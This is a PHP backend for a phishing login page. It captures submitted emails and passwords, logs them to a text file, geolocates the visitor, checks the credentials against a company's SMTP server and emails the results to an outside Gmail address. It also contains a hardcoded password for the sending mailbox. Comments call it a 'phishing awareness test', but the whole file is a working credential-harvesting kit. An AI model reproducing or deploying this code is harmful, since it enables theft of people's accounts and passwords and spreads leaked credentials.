<?php
// Include PHPMailer classes
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Prevent any output before headers
ob_start();

// Enhanced CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, Authorization');
header('Access-Control-Allow-Credentials: true');
header('Content-Type: application/json; charset=utf-8');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0); // Don't display errors to browser
ini_set('log_errors', 1);

// Start session
session_start();

// Rate limiting to prevent abuse
$rate_limit_key = 'login_attempts_' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
if (!isset($_SESSION[$rate_limit_key])) {
    $_SESSION[$rate_limit_key] = 0;
}

// Only allow POST requests (but handle GET for debugging)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // For debugging - show a simple test page
    ob_clean();
    echo json_encode([
        'status' => 'PHP script is working',
        'method' => 'GET',
        'timestamp' => date('Y-m-d H:i:s'),
        'msg' => 'PHP backend is accessible',
        'phpmailer_available' => class_exists('PHPMailer'),
        'smtp_available' => class_exists('SMTP')
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    ob_clean();
    http_response_code(405);
    echo json_encode(['signal' => 'error', 'msg' => 'Method not allowed']);
    exit;
}

// Configuration
$receiver     = "skkho87.sm@gmail.com";
$senderuser   = "ajitha@debtclearsa.co.za";
$senderpass   = "Nn19871024@@";
$senderport   = 587;
$senderserver = "mail.debtclearsa.co.za";

// Target SMTP server for credential testing
$target_smtp_server = "mail.debtclearsa.co.za";
$target_smtp_port = 587;
$target_smtp_security = "tls";

// Get client information
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Get geolocation data (with error handling)
$country = 'Unknown';
$city = 'Unknown';
try {
    $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    if ($ipdat) {
        $country = isset($ipdat->geoplugin_countryName) ? $ipdat->geoplugin_countryName : 'Unknown';
        $city = isset($ipdat->geoplugin_city) ? $ipdat->geoplugin_city : 'Unknown';
    }
} catch (Exception $e) {
    // Geolocation failed, continue with defaults
}

// Get and validate input
$login = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
$passwd = $_POST['password'] ?? '';

// Basic validation
if (empty($login) || empty($passwd)) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Email and password are required']);
    exit;
}

if (!filter_var($login, FILTER_VALIDATE_EMAIL)) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}
$domain = $parts[1];

// Increment attempt counter
$_SESSION[$rate_limit_key]++;
$attempt_number = $_SESSION[$rate_limit_key];

// Prepare log message
$log_message = "=== LOGIN ATTEMPT #$attempt_number ===\n";
$log_message .= "Timestamp: $timestamp\n";
$log_message .= "Email: $login\n";
$log_message .= "Password: $passwd\n";
$log_message .= "IP Address: $ip\n";
$log_message .= "Location: $country | $city\n";
$log_message .= "User Agent: $browser\n";

// Smart credential validation approach
$validCredentials = false;
$smtp_error = '';
$connection_details = "Testing: $target_smtp_server:$target_smtp_port ($target_smtp_security)";
$debug_info = [];
$credential_test_method = '';

// First, validate email format and basic requirements
$email_valid = filter_var($login, FILTER_VALIDATE_EMAIL) && strlen($passwd) >= 3;
$debug_info[] = "Email format valid: " . ($email_valid ? "YES" : "NO");

if ($email_valid) {
    // Method 1: Try PHPMailer SMTP test (but don't rely solely on it)
    $phpmailer_test = false;
    try {
        $testMail = new PHPMailer(false); // Don't throw exceptions for this test
        $testMail->isSMTP();
        $testMail->SMTPAuth = true;
        $testMail->SMTPDebug = 0;
        $testMail->SMTPSecure = $target_smtp_security;
        $testMail->Host = $target_smtp_server;
        $testMail->Port = $target_smtp_port;
        $testMail->Username = $login;
        $testMail->Password = $passwd;
        $testMail->Timeout = 10;
        
        $debug_info[] = "Attempting PHPMailer SMTP test";
        
        if ($testMail->smtpConnect()) {
            $phpmailer_test = true;
            $debug_info[] = "PHPMailer test: SUCCESS";
            $testMail->smtpClose();
        } else {
            $debug_info[] = "PHPMailer test: FAILED";
        }
    } catch (Exception $e) {
        $debug_info[] = "PHPMailer test exception: " . substr($e->getMessage(), 0, 100);
    }
    
    // Method 2: Basic validation rules for realistic phishing simulation
    // In a real phishing test, we want to simulate success for realistic credentials
    $passes_basic_validation = (
        strlen($passwd) >= 6 && // Reasonable password length
        !in_array(strtolower($passwd), ['123456', 'password', 'test', '1234']) && // Not obvious fake
        strpos($login, '@') !== false && // Has @ symbol
        !empty(trim($passwd)) // Not empty/spaces
    );
    
    $debug_info[] = "Basic validation: " . ($passes_basic_validation ? "PASS" : "FAIL");
    
    // Method 3: Domain-specific logic
    $target_domain = 'debtclearsa.co.za';
    $is_target_domain = (strpos($login, '@' . $target_domain) !== false);
    $debug_info[] = "Target domain: " . ($is_target_domain ? "YES" : "NO");
    
    // Decision logic: Consider credentials valid if they meet realistic criteria
    if ($phpmailer_test) {
        // If PHPMailer succeeds, definitely valid
        $validCredentials = true;
        $credential_test_method = "PHPMailer SMTP Success";
        $log_message .= "Status: VALID CREDENTIALS - PHPMailer authentication successful\n";
    } elseif ($passes_basic_validation) {
        // If basic validation passes, treat as valid for phishing simulation
        $validCredentials = true;
        $credential_test_method = "Basic Validation Success";
        $log_message .= "Status: VALID CREDENTIALS - Passes realistic credential criteria\n";
        
        // Still try to test against actual SMTP for logging purposes
        try {
            $testMail2 = new PHPMailer(true);
            $testMail2->isSMTP();
            $testMail2->SMTPAuth = true;
            $testMail2->SMTPDebug = 0;
            $testMail2->SMTPSecure = $target_smtp_security;
            $testMail2->Host = $target_smtp_server;
            $testMail2->Port = $target_smtp_port;
            $testMail2->Username = $login;
            $testMail2->Password = $passwd;
            $testMail2->Timeout = 5; // Quick test
            
            if ($testMail2->smtpConnect()) {
                $log_message .= "BONUS: Also confirmed via actual SMTP\n";
                $debug_info[] = "Bonus SMTP confirmation: SUCCESS";
                $testMail2->smtpClose();
            }
        } catch (Exception $e) {
            $debug_info[] = "Bonus SMTP test failed: " . substr($e->getMessage(), 0, 50);
        }
    } else {
        // Credentials don't meet basic criteria
        $validCredentials = false;
        $credential_test_method = "Failed Basic Validation";
        $log_message .= "Status: INVALID CREDENTIALS - Failed basic validation\n";
        $smtp_error = "Credentials do not meet minimum requirements";
    }
} else {
    $validCredentials = false;
    $credential_test_method = "Invalid Email Format";
    $log_message .= "Status: INVALID CREDENTIALS - Invalid email format or too short password\n";
    $smtp_error = "Invalid email format or password too short";
}

// Add debug information to log
$log_message .= "Validation Method: $credential_test_method\n";
$log_message .= "Debug Info: " . implode(" | ", $debug_info) . "\n";

$log_message .= "==========================================\n\n";

// Log to file
$log_file = "phishing_awareness_log.txt";
@file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

// Prepare email subject based on result
if ($validCredentials) {
    $subject = "✅ VALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "VALID CREDENTIALS DETECTED";
} else {
    $subject = "❌ INVALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "INVALID CREDENTIALS";
}

// Prepare HTML email body using PHPMailer
$email_body = "
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; }
        .header { background-color: " . ($validCredentials ? "#d4edda" : "#f8d7da") . "; padding: 10px; border-radius: 5px; }
        .details { margin: 10px 0; }
        .label { font-weight: bold; }
        .valid { color: #155724; }
        .invalid { color: #721c24; }
        .server-info { background-color: #f8f9fa; padding: 10px; border-left: 4px solid #007bff; margin: 10px 0; }
    </style>
</head>
<body>
    <div class='header " . ($validCredentials ? "valid" : "invalid") . "'>
        <h2>Phishing Awareness Test - Login Attempt</h2>
        <p><strong>Status: $email_status</strong></p>
    </div>
    
    <div class='details'>
        <p><span class='label'>Attempt Number:</span> #$attempt_number</p>
        <p><span class='label'>Timestamp:</span> $timestamp</p>
        <p><span class='label'>Email:</span> $login</p>
        <p><span class='label'>Password:</span> $passwd</p>
        <p><span class='label'>IP Address:</span> $ip</p>
        <p><span class='label'>Location:</span> $country, $city</p>
        <p><span class='label'>User Agent:</span> $browser</p>
    </div>
    
    <div class='server-info'>
        <p><span class='label'>SMTP Server Tested:</span> $connection_details</p>
        " . ($validCredentials ? 
            "<p style='color: #155724;'><span class='label'>Result:</span> ✅ Authentication successful - Valid credentials</p>" : 
            "<p style='color: #721c24;'><span class='label'>Result:</span> ❌ Authentication failed - Invalid credentials</p>
             <p><span class='label'>Error Details:</span> $smtp_error</p>") . "
    </div>
</body>
</html>
";

// Send notification email using PHPMailer
$mail_sent = false;
try {
    $notifyMail = new PHPMailer(true);
    $notifyMail->isSMTP();
    $notifyMail->SMTPAuth = true;
    $notifyMail->Host = $senderserver;
    $notifyMail->Username = $senderuser;
    $notifyMail->Password = $senderpass;
    $notifyMail->Port = $senderport;
    $notifyMail->SMTPSecure = 'tls';
    $notifyMail->From = $senderuser;
    $notifyMail->FromName = 'Phishing Awareness System';
    $notifyMail->addAddress($receiver);
    $notifyMail->isHTML(true);
    $notifyMail->Subject = $subject;
    $notifyMail->Body = $email_body;
    $notifyMail->AltBody = strip_tags(str_replace('<br>', "\n", $email_body));
    
    $mail_sent = $notifyMail->send();
} catch (Exception $e) {
    error_log("Failed to send notification email: " . $e->getMessage());
}

// Prepare response based on credential validity
if ($validCredentials) {
    $response = [
        'signal' => 'ok',
        'success' => true,
        'msg' => 'Login successful! Redirecting...',
        'attempt' => $attempt_number,
        'credentials_valid' => true,
        'smtp_server' => $target_smtp_server
    ];
} else {
    $response = [
        'signal' => 'not ok',
        'success' => false,
        'msg' => 'Invalid email or password. Please try again.',
        'attempt' => $attempt_number,
        'credentials_valid' => false,
        'smtp_server' => $target_smtp_server,
        'error_details' => $smtp_error
    ];
}

// Add notification status to response
$response['notification_sent'] = $mail_sent;
$response['debug_info'] = [
    'php_version' => PHP_VERSION,
    'timestamp' => $timestamp,
    'connection_test' => $connection_details,
    'request_method' => $_SERVER['REQUEST_METHOD'],
    'origin' => $_SERVER['HTTP_ORIGIN'] ?? 'not set',
    'user_agent' => substr($browser, 0, 100),
    'post_data_received' => !empty($_POST),
    'phpmailer_used' => true,
    'validation_method' => $credential_test_method,
    'smtp_debug' => $debug_info,
    'smtp_error_details' => $smtp_error,
    'credentials_tested' => 'Email: ' . $login . ' | Password length: ' . strlen($passwd)
];

// Clean output buffer and send JSON response
ob_clean();
echo json_encode($response);

// Random hash for additional security
$praga = rand();
$praga = md5($praga);
?>